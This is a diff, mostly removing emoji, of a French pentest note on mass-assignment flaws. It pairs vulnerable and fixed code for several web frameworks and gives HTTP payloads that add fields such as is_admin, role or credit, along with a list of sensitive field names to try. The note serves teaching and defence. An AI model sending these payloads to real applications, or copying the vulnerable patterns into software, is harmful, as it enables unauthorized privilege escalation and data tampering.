@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# ⚖️ Mass Assignment
+# Mass Assignment
 
 > [!info] **En 1 phrase**
 > Mass Assignment = l'app assigne **directement** les champs du corps de requête aux propriétés d'un
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -34,7 +34,7 @@ flowchart LR
     D --> F[Escalade admin]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > L'ORM copie le JSON/form vers l'objet **sans filtrage** (`user.save()` avec tout le corps).
 > Le développeur n'attend que `username`, `email`, `password`… mais le framework assigne **tout** :
 > `isAdmin`, `role`, `balance`, `id`… qui peuvent être modifiés.
@@ -53,24 +53,24 @@ flowchart LR
 
 ---
 
-## 🧰 Frameworks vulnérables
+## Frameworks vulnérables
 
 > L'attaque fonctionne partout où le binding entrée → objet est **automatique et non filtré**.
 
-### 🟥 Ruby on Rails (sans strong parameters)
+### Ruby on Rails (sans strong parameters)
 
-> ❌ Code vulnérable : `params[:user]` assigné tel quel.
-> ✅ Correct : `.permit(:name, :email)`.
+> Code vulnérable : `params[:user]` assigné tel quel.
+> Correct : `.permit(:name, :email)`.
 
 ```rb
 # Génération d'un modèle avec un booléen admin (le champ existe en BDD)
 rails generate scaffold User name:string email:string admin:boolean
 
-# ❌ VULNÉRABLE — tout le hash params[:user] est assigné
+# VULNÉRABLE — tout le hash params[:user] est assigné
 @user = User.new(params[:user])
 @user.save
 
-# ✅ CORRECT — whitelist explicite (strong parameters)
+# CORRECT — whitelist explicite (strong parameters)
 @user = User.new(params[:user].permit(:name, :email))
 ```
 
@@ -87,22 +87,22 @@ Content-Type: application/json
 }
 ```
 
-### 🟧 Laravel (PHP)
+### Laravel (PHP)
 
-> `$fillable` / `$guarded` dans le modèle. ❌ `$request->all()` assigne tout.
+> `$fillable` / `$guarded` dans le modèle. `$request->all()` assigne tout.
 
 ```php
-// ❌ VULNÉRABLE — assignation en masse de toutes les entrées
+// VULNÉRABLE — assignation en masse de toutes les entrées
 $user->fill($request->all());
 $user->save();
 
-// ❌ Également vulnérable
+// Également vulnérable
 $user = User::create($request->all());
 
-// ✅ CORRECT — whitelist
+// CORRECT — whitelist
 $user->fill($request->only(['name', 'email']));
 
-// ✅ Ou dans le modèle
+// Ou dans le modèle
 class User extends Model {
     protected $fillable = ['name', 'email'];   // champs autorisés
     // protected $guarded = ['is_admin'];      // champs interdits
@@ -125,21 +125,21 @@ Content-Type: application/x-www-form-urlencoded
 name=attacker&email=a@a.com&is_admin=1
 ```
 
-### 🟩 Django
+### Django
 
 > `fields` / `exclude` dans le serializer, ou création directe.
 
 ```py
-# ❌ VULNÉRABLE — tout le payload est passé à objects.create
+# VULNÉRABLE — tout le payload est passé à objects.create
 user = User.objects.create(**request.data)
 
-# ❌ VULNÉRABLE — serializer sans whitelist de champs
+# VULNÉRABLE — serializer sans whitelist de champs
 class UserSerializer(serializers.ModelSerializer):
     class Meta:
         model = User
         # fields = '__all__'  ← TOUT est accepté !
 
-# ✅ CORRECT — whitelist
+# CORRECT — whitelist
 class UserSerializer(serializers.ModelSerializer):
     class Meta:
         model = User
@@ -154,10 +154,10 @@ Content-Type: application/json
 {"username": "attacker", "email": "a@a.com", "is_staff": true, "is_superuser": true}
 ```
 
-### 🟨 Flask (SQLAlchemy)
+### Flask (SQLAlchemy)
 
 ```py
-# ❌ VULNÉRABLE — update avec tout le JSON reçu
+# VULNÉRABLE — update avec tout le JSON reçu
 @app.route('/api/user', methods=['POST'])
 def create_user():
     data = request.get_json()
@@ -166,7 +166,7 @@ def create_user():
     db.session.commit()
     return jsonify(user.to_dict())
 
-# ✅ CORRECT — ne garder que les champs autorisés
+# CORRECT — ne garder que les champs autorisés
 allowed = {k: data[k] for k in data if k in ['name', 'email']}
 user = User(**allowed)
 ```
@@ -175,19 +175,19 @@ user = User(**allowed)
 {"name": "attacker", "email": "a@a.com", "admin": 1, "credit": 99999}
 ```
 
-### 🟦 Spring Boot (Jackson)
+### Spring Boot (Jackson)
 
 > Jackson désérialise le corps JSON directement dans l'objet annoté `@RequestBody`.
-> ✅ Correct : DTO séparé.
+> Correct : DTO séparé.
 
 ```java
-// ❌ VULNÉRABLE — l'objet métier est la cible directe du JSON
+// VULNÉRABLE — l'objet métier est la cible directe du JSON
 @PostMapping("/api/user")
 public User createUser(@RequestBody User user) {
     return userService.save(user);   // isAdmin, id... du JSON assignés
 }
 
-// ✅ CORRECT — DTO avec seulement les champs autorisés
+// CORRECT — DTO avec seulement les champs autorisés
 @PostMapping("/api/user")
 public User createUser(@RequestBody UserDTO dto) {
     User user = new User();
@@ -201,21 +201,21 @@ public User createUser(@RequestBody UserDTO dto) {
 {"name": "attacker", "email": "a@a.com", "isAdmin": true, "id": 1}
 ```
 
-### 🟪 Node.js / Express + Mongoose
+### Node.js / Express + Mongoose
 
 ```js
-// ❌ VULNÉRABLE — tout req.body est collé au document
+// VULNÉRABLE — tout req.body est collé au document
 const user = new User(req.body);
 await user.save();
 
-// ❌ Également vulnérable
+// Également vulnérable
 await User.findByIdAndUpdate(req.params.id, req.body);
 
-// ✅ CORRECT — whitelist manuelle
+// CORRECT — whitelist manuelle
 const allowed = { name: req.body.name, email: req.body.email };
 await User.findByIdAndUpdate(req.params.id, allowed);
 
-// ✅ Ou schéma avec option strict, champs exclus via select:false
+// Ou schéma avec option strict, champs exclus via select:false
 //   new Schema({ ..., isAdmin: { type: Boolean, select: false } })
 ```
 
@@ -227,12 +227,12 @@ Content-Type: application/json
 {"name": "attacker", "role": "admin", "password": "newpass"}
 ```
 
-### 🟫 ASP.NET (Model Binding)
+### ASP.NET (Model Binding)
 
 > Le model binding lie les champs de la requête aux propriétés publiques du modèle.
 
 ```csharp
-// ❌ VULNÉRABLE — le modèle métier est le paramètre d'action
+// VULNÉRABLE — le modèle métier est le paramètre d'action
 [HttpPost]
 public IActionResult Create([FromBody] User user)
 {
@@ -241,7 +241,7 @@ public IActionResult Create([FromBody] User user)
     return Ok();
 }
 
-// ✅ CORRECT — view model / DTO
+// CORRECT — view model / DTO
 public class UserDTO
 {
     public string Name { get; set; }
@@ -255,7 +255,7 @@ public class UserDTO
 
 ---
 
-## 🎒 Payloads
+## Payloads
 
 ### Champ unique ajouté
 
@@ -304,13 +304,13 @@ Content-Type: application/json
 {"user": {"username": "attacker", "is_admin": true}}
 ```
 
-> [!tip] 💡 **Enveloppes** : si l'app attend `{"user": {...}}`, testez aussi
+> [!tip] **Enveloppes** : si l'app attend `{"user": {...}}`, testez aussi
 > le payload **direct** `{"username":..., "is_admin": true}` et inversement.
 > Certains frameworks normalisent les deux.
 
 ---
 
-## ⚔️ Exploitation — objectifs concrets
+## Exploitation — objectifs concrets
 
 ### Escalade de rôle / privilèges
 
@@ -358,7 +358,7 @@ Content-Type: application/json
 
 ---
 
-## 🕵️ Détection
+## Détection
 
 > L'objectif : **lister les champs de l'objet**, puis tester chaque champ sensible en l'ajoutant.
 
@@ -379,13 +379,13 @@ price  total  status  verified  email_verified  approved  active  enabled
 is_paid  paid  subscription  plan  premium  vip  privilege  level  rank
 ```
 
-> [!tip] 💡 **Cible privilégiée** : les endpoints de **création** (POST) et de
+> [!tip] **Cible privilégiée** : les endpoints de **création** (POST) et de
 > **mise à jour** (PUT/PATCH) d'objets — surtout les profils, commandes, articles,
 > réservations. La réponse qui **reflète le champ ajouté** = confirmation immédiate.
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 ### Burp Suite (méthode manuelle)
 
@@ -434,7 +434,7 @@ for f in fields:
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -449,15 +449,15 @@ for f in fields:
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre des tests**
+> [!tip] **Ordre des tests**
 > 1. **Trouver les champs** (docs API, JS, réponse GET de l'objet).
 > 2. **Envoyer un champ inconnu** et observer la réponse (reflété ? statut différent ?).
 > 3. **Confirmer la persistance** : relire l'objet (GET) — un 200 ne suffit pas.
 > 4. **Vérifier l'impact réel** : tester la route admin / une action réservée au rôle.
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - **Le champ n'est pas reflété** : la réponse ne renvoie que les champs publics
 >   (`select: false`, `hidden`, sérialiseur filtré) → lire l'objet via GET, ou tester
 >   l'effet réel (accès à une zone admin).
@@ -474,11 +474,11 @@ for f in fields:
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[IDOR|🎯 IDOR]] — deviner/bruteforcer les identifiants d'une ressource
-- [[Injection SQL|💾 SQLi]] — autre vector d'altération de données
-- [[Business Logic|🧠 Business Logic]] — abus de logique métier (prix, workflow)
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Mass Assignment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md)
-- 🧪 Labs : [PentesterAcademy — Mass Assignment I](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1964) · [Mass Assignment II](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1922) · [Root-Me — API Mass Assignment](https://www.root-me.org/en/Challenges/Web-Server/API-Mass-Assignment)
+- [[IDOR| IDOR]] — deviner/bruteforcer les identifiants d'une ressource
+- [[Injection SQL| SQLi]] — autre vector d'altération de données
+- [[Business Logic| Business Logic]] — abus de logique métier (prix, workflow)
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Mass Assignment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md)
+- Labs : [PentesterAcademy — Mass Assignment I](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1964) · [Mass Assignment II](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1922) · [Root-Me — API Mass Assignment](https://www.root-me.org/en/Challenges/Web-Server/API-Mass-Assignment)
